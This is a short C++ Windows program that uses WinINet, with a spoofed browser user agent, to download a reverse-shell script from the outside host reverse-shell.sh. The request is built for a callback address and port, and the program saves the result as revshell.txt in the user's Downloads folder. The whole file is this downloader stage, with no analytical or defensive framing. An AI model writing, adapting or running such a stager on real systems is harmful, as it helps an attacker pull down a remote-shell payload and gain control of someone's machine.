#include <windows.h>
#include <wininet.h>
#include <fstream>
#include <shlobj.h>  // For SHGetKnownFolderPath

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shell32.lib")

int main() {
    HINTERNET hInternet, hConnect, hRequest;
    DWORD bytesRead, bytesWritten;
    char buffer[4096];
    BOOL bRead;

    // Starts a WinINet session
    hInternet = InternetOpen("Mozilla/5.0 (Windows NT 10.0; Win64; x64)", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

    // Connects to the server
    hConnect = InternetConnect(hInternet, "reverse-shell.sh", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);

    // Creates a GET request
    hRequest = HttpOpenRequest(hConnect, "GET", "/127.0.0.1:1337", NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);

    // Sends the request
    HttpSendRequest(hRequest, NULL, 0, NULL, 0);

    // Obtains the path to the Downloads folder
    PWSTR pathDownloads;
    SHGetKnownFolderPath(FOLDERID_Downloads, 0, NULL, &pathDownloads);

    wchar_t downloadPath[MAX_PATH];
    wcscpy(downloadPath, pathDownloads);
    wcscat(downloadPath, L"\\revshell.txt");
    CoTaskMemFree(pathDownloads);

    // Creates a file to store the response (using the wide-character version of the function)
    HANDLE hFile = CreateFileW(downloadPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    // Reads the response and writes it to the file
    do {
        bRead = InternetReadFile(hRequest, buffer, sizeof(buffer), &bytesRead);
        WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL);
    } while (bytesRead > 0);

    // Closes the handles
    CloseHandle(hFile);
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return 0;
}
